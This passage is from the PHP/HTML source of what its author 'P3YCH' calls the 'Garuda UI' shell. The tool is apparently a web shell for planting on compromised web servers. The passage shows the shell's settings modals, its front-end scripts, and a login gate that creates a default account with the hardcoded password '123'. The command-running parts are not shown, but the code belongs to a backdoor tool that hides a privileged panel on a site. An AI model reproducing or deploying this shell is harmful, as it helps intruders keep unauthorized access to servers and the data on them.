                <div class="input-group has-validation">
                  <span class="input-group-text">
                    <svg height="21" viewBox="0 0 21 21" width="21" xmlns="http://www.w3.org/2000/svg"><path d="m7.5.5c1.65685425 0 3 1.34314575 3 3v2c0 1.65685425-1.34314575 3-3 3s-3-1.34314575-3-3v-2c0-1.65685425 1.34314575-3 3-3zm7 14v-.7281753c0-3.1864098-3.6862915-5.2718247-7-5.2718247s-7 2.0854149-7 5.2718247v.7281753c0 .5522847.44771525 1 1 1h12c.5522847 0 1-.4477153 1-1z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" transform="translate(3 2)"/></svg>
                  </span>
                  <input type="text" class="form-control" name="new_username" value="<?php echo $username ?>" required>
                  <div class="invalid-feedback">
                    Silakan masukkan terlebih dahulu nama ya
                  </div>
                </div>
              </div>
              <div class="col-12">
                <div class="d-grid gap-2">
                  <button class="btn btn-primary" type="submit" name="change_username">Ganti username</button>
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
    
    <!-- Ganti Password -->
    <div class="modal fade p-3" id="setting-pass" tabindex="-1" aria-labelledby="setting-passLabel" aria-hidden="true">
      <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content border-0 shadow-sm">
          <div class="modal-body">
            <form class="row g-3 needs-validation" method="POST" novalidate>
              <div class="col-12">
                <div class="input-group has-validation">
                  <span class="input-group-text">
                    <svg height="21" viewBox="0 0 21 21" width="21" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd" transform="translate(4 1)"><path d="m2.5 8.5-.00586729-1.99475098c-.00728549-4.00349935 1.32800361-6.00524902 4.00586729-6.00524902s4.0112203 2.00174967 4.0000699 6.00524902v1.99475098m-8.0000699 0h8.0225317c1.0543618 0 1.9181652.81587779 1.9945143 1.8507377l.0054778.1548972-.0169048 6c-.0031058 1.1023652-.8976224 1.9943651-1.999992 1.9943651h-8.005627c-1.1045695 0-2-.8954305-2-2v-6c0-1.1045695.8954305-2 2-2z" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/><circle cx="6.5" cy="13.5" fill="currentColor" r="1.5"/></g></svg>
                  </span>
                  <input type="password" class="form-control" name="new_password" placeholder="Masukkan password baru" required>
                  <div class="invalid-feedback">
                    Silakan masukkan terlebih dahulu password ya
                  </div>
                </div>
              </div>
              <div class="col-12">
                <div class="d-grid gap-2">
                  <button class="btn btn-primary" type="submit" name="change_password">Ganti password</button>
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
    
    <!-- Profile -->
    <div class="modal fade p-3" id="profile" tabindex="-1" aria-labelledby="profileLabel" aria-hidden="true">
      <div class="modal-dialog modal-xl modal-dialog-centered modal-dialog-scrollable">
        <div class="modal-content border-0 shadow-sm">
          <div class="modal-body">
            <div class="card border-0 shadow-sm">
              <div class="row g-0">
                <div class="col-md-4">
                  <img src="//p3ychid.my.id/image/72c7a403de42654fb0c1907d870bbdd8.png" class="img-fluid rounded-start mt-5" alt="Garuda UI">
                </div>
                <div class="col-md-8">
                  <div class="card-body">
                    <h5 class="card-title">Garuda UI</h5>
                    <p class="card-text">Hallo saya P3YCH, pembuat dari shell Garuda UI dan saya merasa senang karena shell saya bisa anda pakai sebagai mungkin karena ini ada versi kami yang terakhir, terimakasih sudah mensupport dan mendukung kami.</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="modal-footer">
            <div class="d-flex flex-wrap justify-content-between align-items-center py-0">
              <div class="col-6">
                Ikutin terus sosial media kami.
              </div>
              <div class="col-6">
                <ul class="nav justify-content-end list-unstyled d-flex">
                  <li class="ms-3">
                    <a class="text-body-secondary" href="#">
                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-github" viewBox="0 0 16 16">
                        <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z"/>
                      </svg>
                    </a>
                  </li>
                  <li class="ms-3">
                    <a class="text-body-secondary" href="#">
                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-whatsapp me-4" viewBox="0 0 16 16">
                        <path d="M13.601 2.326A7.854 7.854 0 0 0 7.994 0C3.627 0 .068 3.558.064 7.926c0 1.399.366 2.76 1.057 3.965L0 16l4.204-1.102a7.933 7.933 0 0 0 3.79.965h.004c4.368 0 7.926-3.558 7.93-7.93A7.898 7.898 0 0 0 13.6 2.326zM7.994 14.521a6.573 6.573 0 0 1-3.356-.92l-.24-.144-2.494.654.666-2.433-.156-.251a6.56 6.56 0 0 1-1.007-3.505c0-3.626 2.957-6.584 6.591-6.584a6.56 6.56 0 0 1 4.66 1.931 6.557 6.557 0 0 1 1.928 4.66c-.004 3.639-2.961 6.592-6.592 6.592zm3.615-4.934c-.197-.099-1.17-.578-1.353-.646-.182-.065-.315-.099-.445.099-.133.197-.513.646-.627.775-.114.133-.232.148-.43.05-.197-.1-.836-.308-1.592-.985-.59-.525-.985-1.175-1.103-1.372-.114-.198-.011-.304.088-.403.087-.088.197-.232.296-.346.1-.114.133-.198.198-.33.065-.134.034-.248-.015-.347-.05-.099-.445-1.076-.612-1.47-.16-.389-.323-.335-.445-.34-.114-.007-.247-.007-.38-.007a.729.729 0 0 0-.529.247c-.182.198-.691.677-.691 1.654 0 .977.71 1.916.81 2.049.098.133 1.394 2.132 3.383 2.992.47.205.84.326 1.129.418.475.152.904.129 1.246.08.38-.058 1.171-.48 1.338-.943.164-.464.164-.86.114-.943-.049-.084-.182-.133-.38-.232z"/>
                      </svg>
                    </a>
                  </li>
        </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
    <script type="text/javascript" charset="utf-8">
      var audio = document.getElementById("audio");
      var playPauseBtn = document.getElementById("play-pause-btn");
      var muteBtn = document.getElementById("mute-btn");
      var timeDisplay = document.getElementById("time");
      var progressBar = document.getElementById("progress-bar");
      
      audio.addEventListener("loadedmetadata", function() {
        var duration = formatTime(audio.duration);
        timeDisplay.textContent = "00:00 / " + duration;
      });
      
      playPauseBtn.addEventListener("click", function() {
        if (audio.paused) {
          audio.play();
          playPauseBtn.innerHTML = '<i class="bi bi-pause fs-4"></i>';
        } else {
          audio.pause();
          playPauseBtn.innerHTML = '<i class="bi bi-play fs-4"></i>';
        }
      });
      
      muteBtn.addEventListener("click", function() {
        if (audio.muted) {
          audio.muted = false;
          muteBtn.innerHTML = '<i class="bi bi-volume-down fs-4"></i>';
        } else {
          audio.muted = true;
          muteBtn.innerHTML = '<i class="bi bi-volume-mute fs-4"></i>';
        }
      });
      
      function setSpeed(speed) {
        audio.playbackRate = speed;
      }
      
      audio.addEventListener("timeupdate", function() {
        var currentTime = formatTime(audio.currentTime);
        var duration = formatTime(audio.duration);
        timeDisplay.textContent = currentTime + " / " + duration;
        var progress = (audio.currentTime / audio.duration) * 100;
        progressBar.style.width = progress + "%";
      });
      
      audio.addEventListener("ended", function() {
        progressBar.style.width = "0";
        playPauseBtn.innerHTML = '<i class="bi bi-play fs-4"></i>';
      });
      
      function formatTime(seconds) {
        var minutes = Math.floor(seconds / 60);
        var remainingSeconds = Math.floor(seconds % 60);
        return padZero(minutes) + ":" + padZero(remainingSeconds);
      }
      
      function padZero(number) {
        return (number < 10 ? "0" : "") + number;
      }
    </script>
    <script type="text/javascript" charset="utf-8">var Nanobar=function(){var c,d,e,f,g,h,k={width:"100%",height:"4px",zIndex:9999,top:"0"},l={width:0,height:"100%",clear:"both",transition:"height .3s"};c=function(a,b){for(var c in b)a.style[c]=b[c];a.style["float"]="left"};f=function(){var a=this,b=this.width-this.here;0.1>b&&-0.1<b?(g.call(this,this.here),this.moving=!1,100==this.width&&(this.el.style.height=0,setTimeout(function(){a.cont.el.removeChild(a.el)},100))):(g.call(this,this.width-b/4),setTimeout(function(){a.go()},16))};g=function(a){this.width=a;this.el.style.width=this.width+"%"};h=function(){var a=new d(this);this.bars.unshift(a)};d=function(a){this.el=document.createElement("div");this.el.style.backgroundColor=a.opts.bg;this.here=this.width=0;this.moving=!1;this.cont=a;c(this.el,l);a.el.appendChild(this.el)};d.prototype.go=function(a){a?(this.here=a,this.moving||(this.moving=!0,f.call(this))):this.moving&&f.call(this)};e=function(a){a=this.opts=a||{};var b;a.bg=a.bg||"#1266f1";this.bars=[];b=this.el=document.createElement("div");c(this.el,k);a.id&&(b.id=a.id);b.style.position=a.target?"relative":"fixed";a.target?a.target.insertBefore(b,a.target.firstChild):document.getElementsByTagName("body")[0].appendChild(b);h.call(this)};e.prototype.go=function(a){this.bars[0].go(a);100==a&&h.call(this)};return e}();var nanobar = new Nanobar();nanobar.go(30);nanobar.go(60);nanobar.go(100);</script>
    <script type="text/javascript" charset="utf-8">
      window.onload = function() {
        setTimeout(function(){
          document.getElementById("myBtn").style.display = "block";
        }, 1000);
      }
      function topFunction() {
        document.body.scrollTop = 0;
        document.documentElement.scrollTop = 0;
      }
    </script>
    
    <script type="text/javascript" charset="utf-8">
      (() => {
        'use strict'
        
        const forms = document.querySelectorAll('.needs-validation')
        
        Array.from(forms).forEach(form => {
          form.addEventListener('submit', event => {
            if (!form.checkValidity()) {
              event.preventDefault()
              event.stopPropagation()
            }
      
            form.classList.add('was-validated')
          }, false)
        })
      })()
    </script>
  </body>
</html>

<?php
} else {
  if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $file_path = 'Garuda UI/data-login.json';
    $json_data = file_get_contents($file_path);
    $data = json_decode($json_data, true);
    $valid_username = $data[0]['Username'];
    $valid_password_hash = $data[0]['Password'];
    
    if ($username === $valid_username && password_verify($password, $valid_password_hash)) {
      $_SESSION['loggedin'] = true;
      header('Location: ' . $_SERVER['HTTP_REFERER']);
      exit;
    } else {
      ?>
      <div class="alert alert-danger rounded-0 rounded-bottom" role="alert">Invalid username or password!</div>
      <?php
    }
  }
  ?>
  <!DOCTYPE html>
  <html data-bs-theme="dark">
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Login!</title>
      
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
      
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
    </head>
    <body>
      <div class="container align-items-center d-flex justice-content-center" style="height:70vh;">
        <form class="row g-3 needs-validation m-4" method="post" novalidate>
          <a class="text-reset text-center"><i class="bi bi-person display-1"></i></a>
          <h1 class="border-0 border-bottom border-dark">Mohon login, terlebih dahulu!</h1>
          <div class="col-sm-6 col-md-12">
            <div class="input-group has-validation">
              <span class="input-group-text" id="username"><i class="bi bi-envelope-at"></i></span>
              <input type="username" class="form-control" id="username" name="username" aria-describedby="username" placeholder="Username" required>
              <div class="invalid-feedback">
                Username belum dimasukkan!
              </div>
            </div>
          </div>
          <div class="col-sm-6 col-md-12">
            <div class="input-group has-validation">
              <span class="input-group-text" id="password"><i class="bi bi-key"></i></span>
              <input type="password" class="form-control" id="password" name="password" aria-describedby="password" placeholder="Password" required>
              <div class="invalid-feedback">
                Password belum dimasukkan!
              </div>
            </div>
          </div>
          <div class="col-md-12">
            <button class="btn btn-primary" type="submit">Login</button>
          </div>
        </form>
      </div>
      <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
      <script type="text/javascript" charset="utf-8">
        (() => {
          'use strict'
          
          const forms = document.querySelectorAll('.needs-validation')
          
          Array.from(forms).forEach(form => {
            form.addEventListener('submit', event => {
              if (!form.checkValidity()) {
                event.preventDefault()
                event.stopPropagation()
              }
              form.classList.add('was-validated')
            }, false)
          })
        })()
        </script>
      </body>
    </html>
  <?php
  $passlogin = "123";
  $passenkripsi = password_hash($passlogin, PASSWORD_BCRYPT);
  $data = array(
    array(
      'Username' => 'P3YCH',
      'Password' => $passenkripsi
    )
  );
  $folder_path = 'Garuda UI';
  $file_path = $folder_path . '/data-login.json';
  
  if (!file_exists($folder_path)) {
    mkdir($folder_path);
  }
  
  if (!file_exists($file_path)) {
    file_put_contents($file_path, json_encode($data, JSON_PRETTY_PRINT));
  }
}
?>